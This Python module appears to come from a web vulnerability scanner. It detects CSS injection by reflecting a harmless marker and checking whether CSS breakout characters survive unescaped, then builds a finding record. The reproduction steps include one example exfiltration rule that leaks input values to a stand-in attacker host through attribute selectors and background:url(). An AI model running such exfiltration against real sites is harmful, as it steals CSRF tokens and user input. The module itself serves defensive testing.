"""CSS injection engine (CWE-74 / WSTG-CLNT-05). When user input is reflected into a CSS context — inside a
`<style>...</style>` block or a `style="..."` attribute — and the CSS structural characters survive
unescaped, an attacker can inject CSS rules. That enables data exfiltration (attribute selectors +
`background:url()` leak CSRF tokens / input values character-by-character) even where script is blocked by CSP.

CONFIRMATION IS A REFLECTION-CONTEXT ORACLE (same discipline as reflected XSS, but for the STYLE context): a
unique marker carrying CSS breakout characters must reflect back inside a style context with those characters
INTACT (not HTML-entity-encoded). Reflection alone is not enough — the `{ } ;` must survive, else the value
is safely encoded. Pure logic here (payload + oracle + finding); the HTTP transport lives in tools."""
from __future__ import annotations

import re

_MARK = "apolcss"


def payload(token: str) -> str:
    """A marker plus a CSS rule fragment. In a <style> block the `{...}` injects a rule; in a style="" attr
    the `;prop:val` adds a declaration. Carrying both lets one probe confirm either context."""
    return "%s%s;x{color:red}" % (_MARK, token)


def _in_style_block(body: str, idx: int) -> bool:
    before = body[:idx].lower()
    o = before.rfind("<style")
    c = before.rfind("</style>")
    return o != -1 and o > c


def _in_style_attr(body: str, idx: int) -> bool:
    # crude but effective: the nearest style=" before us is not yet closed by a matching quote before us
    seg = body[max(0, idx - 200):idx].lower()
    m = list(re.finditer(r'style\s*=\s*["\']', seg))
    if not m:
        return False
    after_attr = seg[m[-1].end():]
    return '"' not in after_attr and "'" not in after_attr


def evaluate(body: str, token: str) -> dict:
    """Confirmed when the marker reflects inside a CSS context with the breakout chars unescaped."""
    mark = _MARK + token
    body = body or ""
    i = body.find(mark)
    if i < 0:
        return {"confirmed": False, "oracle": "", "where": ""}
    tail = body[i:i + len(mark) + 24]          # the reflected marker + what follows it
    # entity-encoded structural chars mean the value was safely encoded -> not injectable
    if "&#" in tail or "&lt;" in tail or "&#123" in tail:
        return {"confirmed": False, "oracle": "", "where": ""}
    if _in_style_block(body, i) and "{" in tail and "}" in tail:
        return {"confirmed": True, "where": "style block",
                "oracle": "input reflects inside a <style> block with '{' and '}' unescaped — arbitrary CSS "
                          "rules can be injected (data exfiltration via attribute-selector url() leaks)"}
    if _in_style_attr(body, i) and ";" in tail and ":" in tail:
        return {"confirmed": True, "where": "style attribute",
                "oracle": "input reflects inside a style=\"...\" attribute with ';' and ':' unescaped — extra "
                          "CSS declarations can be injected"}
    return {"confirmed": False, "oracle": "", "where": ""}


def finding(url: str, param: str, where: str, oracle: str) -> dict:
    return {
        "title": "CSS injection in parameter '%s' (%s)" % (param, where),
        "severity": "medium", "family": "css_injection", "confidence": "confirmed", "target": url,
        "cwe": "CWE-74", "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "cvss_score": 6.1,
        "evidence": "The parameter '%s' is reflected into a CSS %s unsanitised. %s" % (param, where, oracle),
        "success_oracle": oracle,
        "reproduction_steps": ["Reflect a marker with CSS breakout characters ({ } ; :) via '%s'." % param,
                               "Confirm the characters survive unescaped in the %s." % where,
                               "Exfiltrate data with attribute selectors, e.g. "
                               "input[value^='a']{background:url(//attacker/a)}."],
        "impact": ("Inject CSS to exfiltrate sensitive DOM values (CSRF tokens, input contents) via selector-"
                   "driven background requests, deface the page, or overlay UI — works even under a script-CSP."),
        "remediation": ("Never reflect user input into a <style> block or style attribute; if unavoidable, strip "
                        "or CSS-escape { } ; : ( ) < > and enforce a CSP with a strict style-src."),
        "tags": ["css-injection", "client-side", "cwe-74"],
    }
